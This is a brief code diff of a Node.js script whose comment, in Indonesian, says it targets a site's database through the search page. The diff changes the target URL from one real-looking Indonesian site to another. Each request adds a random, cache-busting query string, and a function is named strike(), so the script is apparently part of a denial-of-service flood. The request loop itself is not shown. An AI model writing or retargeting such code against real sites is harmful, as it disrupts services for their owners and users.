@@ -1,7 +1,7 @@
 const https = require('https');
 
 // TARGET JANTUNG DATABASE (Halaman Pencarian)
-const target = 'https://mediasriwijaya.com/?s=' + Math.random().toString(36).substring(7);
+const target = 'https://tuntasonline.id/?s=' + Math.random().toString(36).substring(7);
 
 function strike() {
     const options = {
